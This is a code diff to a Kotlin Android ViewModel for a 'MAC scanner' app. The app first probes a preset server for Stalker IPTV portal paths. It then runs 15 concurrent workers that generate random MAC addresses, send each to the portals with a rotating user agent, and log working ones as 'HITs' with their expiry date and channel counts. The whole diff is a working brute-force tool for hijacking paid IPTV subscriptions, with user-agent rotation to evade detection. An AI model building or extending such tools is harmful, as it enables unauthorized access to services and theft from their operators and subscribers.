@@ -5,108 +5,138 @@ import androidx.compose.runtime.mutableStateOf
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
 import com.foxy.macscanner.data.model.MacHit
-import com.foxy.macscanner.data.model.PortalResult
 import com.foxy.macscanner.data.repository.ScannerRepository
+import com.foxy.macscanner.utils.PortalConfig
 import com.foxy.macscanner.utils.MacGenerator
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.async
-import kotlinx.coroutines.awaitAll
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.sync.Mutex
-import kotlinx.coroutines.sync.withLock
+import kotlinx.coroutines.*
+import java.util.concurrent.atomic.AtomicInteger
 
 class ScannerViewModel(private val repository: ScannerRepository) : ViewModel() {
 
-    // متغيرات الحالة لمراقبة مدخلات المستخدم وعملية الفحص في الواجهة (UI States)
-    var serverUrl = mutableStateOf("http://f01.live:8080")
-    var botCountInput = mutableStateOf("100") // عدد الماكات المطلوب توليدها وفحصها
-    var isScanning = mutableStateOf(false)
-    var currentProgressMessage = mutableStateOf("جاهز لبدء الفحص")
+    val serverUrl = mutableStateOf("http://f01.live:8080")
+    val botCountInput = mutableStateOf("1000")
+    val isScanning = mutableStateOf(false)
+    val currentProgressMessage = mutableStateOf("Ready to scan")
 
-    // قوائم مراقبة النتائج (Thread-Safe بمساعدة Mutex عند تحديثها من خيوط مختلفة)
-    val foundPortals = mutableStateListOf<PortalResult>()
     val activeHits = mutableStateListOf<MacHit>()
     val scanLogs = mutableStateListOf<String>()
 
-    // أداة القفل المتبادل (Mutex) لتجنب خطأ ConcurrentModificationException الشهير في أندرويد
-    private val mutex = Mutex()
+    private var scanJob: Job? = null
 
-    /**
-     * الدالة الرئيسية لبدء العملية الكاملة (فحص البوابات أولاً ثم فحص الـ MACs)
-     */
     fun startScanningProcess() {
-        // تفاصيل صغيرة: منع المستخدم من إطلاق فحصين في نفس الوقت
-        if (isScanning.value) return
+        val totalToScan = botCountInput.value.toIntOrNull() ?: 1000
+        isScanning.value = true
+        activeHits.clear()
+        scanLogs.clear()
+        
+        scanLogs.add("🚀 Initializing ultra-fast scanner...")
 
-        viewModelScope.launch(Dispatchers.Main) {
-            isScanning.value = true
-            foundPortals.clear()
-            activeHits.clear()
-            scanLogs.clear()
-            
-            val totalBots = botCountInput.value.toIntOrNull() ?: 50
-            scanLogs.add("⏳ جاري فحص مسارات البوابات المحتملة للسيرفر...")
+        scanJob = viewModelScope.launch(Dispatchers.IO) {
+            try {
+                // 1. Discover valid portals endpoints very fast
+                scanProgress("Checking active portal endpoints...")
+                val checkedUrl = serverUrl.value.trim()
+                val validPortals = mutableListOf<String>()
+                
+                // Scan paths in parallel
+                val pathJobs = PortalConfig.payloads.map { path ->
+                    async {
+                        val fullPath = if (checkedUrl.endsWith("/")) "$checkedUrl${path.removePrefix("/")}" else "$checkedUrl$path"
+                        if (repository.checkPortalEndpoint(fullPath)) {
+                            synchronized(validPortals) { validPortals.add(fullPath) }
+                        }
+                    }
+                }
+                pathJobs.awaitAll()
 
-            // 1. فحص البوابات المتاحة على السيرفر
-            val portals = repository.checkServerPortals(serverUrl.value)
-            foundPortals.addAll(portals)
+                if (validPortals.isEmpty()) {
+                    withContext(Dispatchers.Main) {
+                        scanLogs.add("❌ Error: No active Stalker portals found on this server.")
+                        isScanning.value = false
+                        scanProgress("Scan failed.")
+                    }
+                    return@launch
+                }
 
-            val activePortals = portals.filter { it.isWorking }
-            
-            if (activePortals.isEmpty()) {
-                scanLogs.add("❌ لم يتم العثور على بوابات Stalker نشطة على هذا السيرفر.")
-                isScanning.value = false
-                return@launch
-            }
+                withContext(Dispatchers.Main) {
+                    scanLogs.add("🟢 Found ${validPortals.size} active endpoints! Launching 15 Multi-Bots...")
+                }
 
-            scanLogs.add("🟢 تم العثور على (${activePortals.size}) بوابة مفتوحة! بدء توليد وفحص الـ MACs...")
-            
-            // 2. توليد قائمة الـ MAC Addresses العشوائية بناءً على طلب المستخدم
-            val macList = MacGenerator.generateMacList(totalBots)
-            
-            // 3. إطلاق الـ Bots (التوازي المتعدد بحد أقصى 15 بوت متزامن كما في بايثون)
-            // سنقوم بتقسيم الماكات إلى مجموعات (Chunks) بحجم 15 لتشغيل 15 Coroutine معاً
-            val chunks = macList.chunked(15)
-            
-            var checkedCount = 0
+                // 2. Multi-threaded MAC scanning loop
+                val counter = AtomicInteger(0)
+                
+                // Creating a pool of 15 concurrent workers
+                val workersCount = 15
+                val channel = MacGenerator.generateRandomMacs(totalToScan) // Assume helper yields iterable or we loop
 
-            for (chunk in chunks) {
-                if (!isScanning.value) break // إمكانية إيقاف الفحص يدوياً
+                val jobs = List(workersCount) {
+                    launch {
+                        while (isActive && counter.get() < totalToScan) {
+                            val currentProgress = counter.incrementAndGet()
+                            if (currentProgress > totalToScan) break
 
-                // تشغيل الـ 15 بوت بالتوازي عبر async
-                val deferredJobs = chunk.map { mac ->
-                    async(Dispatchers.IO) {
-                        // فحص الماك الحالي على أول بوابة نشطة تم العثور عليها
-                        val targetPortal = activePortals.first()
-                        val hitResult = repository.checkSingleMac(targetPortal.baseUrl, targetPortal.path, mac)
-                        
-                        // تحديث الواجهة بشكل آمن باستخدام الـ Mutex
-                        mutex.withLock {
-                            checkedCount++
-                            currentProgressMessage.value = "تم فحص $checkedCount من أصل $totalBots"
+                            val targetMac = MacGenerator.generateSingleMac()
+                            val randomUserAgent = PortalConfig.userAgents.random()
                             
-                            if (hitResult != null) {
-                                activeHits.add(hitResult)
-                                scanLogs.add("🔥 HIT عثر على ماك شغال: ${hitResult.macAddress}")
+                            // Log every 20 attempts to avoid UI lag
+                            if (currentProgress % 20 == 0 || currentProgress == 1) {
+                                withContext(Dispatchers.Main) {
+                                    scanProgress("Scanned $currentProgress / $totalToScan MACs")
+                                }
+                            }
+
+                            // Try hitting all discovered valid paths
+                            for (portal in validPortals) {
+                                val result = repository.scanMacAddress(portal, targetMac, randomUserAgent)
+                                if (result != null && result.isValid) {
+                                    withContext(Dispatchers.Main) {
+                                        val newHit = MacHit(
+                                            macAddress = targetMac,
+                                            expiryDate = result.expiryDate ?: "Unlimited",
+                                            maxConnections = result.maxConnections ?: "1",
+                                            liveCount = result.liveCount ?: 0,
+                                            vodCount = result.vodCount ?: 0,
+                                            seriesCount = result.seriesCount ?: 0
+                                        )
+                                        activeHits.add(newHit)
+                                        scanLogs.add(0, "🔥 [HIT] $targetMac | Exp: ${newHit.expiryDate}")
+                                    }
+                                    break // Stop checking other paths if one works
+                                }
                             }
                         }
                     }
                 }
-                // الانتظار حتى تنتهي المجموعة الحالية (15 بوت) قبل الانتقال للمجموعة التالية
-                deferredJobs.awaitAll()
-            }
 
-            scanLogs.add("✅ اكتملت عملية الفحص بالكامل.")
-            isScanning.value = false
+                jobs.joinAll()
+                withContext(Dispatchers.Main) {
+                    scanLogs.add(0, "✅ Scan process finished completely.")
+                    scanProgress("Scan completed successfully.")
+                    isScanning.value = false
+                }
+
+            } catch (e: CancellationException) {
+                withContext(Dispatchers.Main) {
+                    scanLogs.add(0, "🛑 Scanning stopped by user.")
+                    scanProgress("Scan stopped.")
+                    isScanning.value = false
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    scanLogs.add(0, "❌ System Error: ${e.localizedMessage}")
+                    isScanning.value = false
+                }
+            }
         }
     }
 
-    /**
-     * إمكانية إيقاف الفحص يدوياً من قبل المستخدم
-     */
     fun stopScanning() {
-        isScanning.value = false
-        currentProgressMessage.value = "تم إيقاف الفحص يدوياً"
-        scanLogs.add("🛑 تم إيقاف عملية الفحص بطلب من المستخدم.")
+        scanJob?.cancel()
+    }
+
+    private suspend fun scanProgress(msg: String) {
+        withContext(Dispatchers.Main) {
+            currentProgressMessage.value = msg
+        }
     }
 }
